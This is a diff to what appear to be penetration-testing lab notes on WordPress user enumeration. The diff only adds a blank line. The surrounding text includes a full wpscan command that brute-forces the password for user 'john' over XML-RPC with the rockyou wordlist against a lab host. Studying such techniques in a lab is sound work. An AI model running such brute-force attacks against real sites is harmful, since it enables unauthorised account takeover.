@@ -14,6 +14,7 @@ Invalid Username
 
 ![invalid](../Images/invalid-username.png)
 
+
 Brute Force Login
 ```
 sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
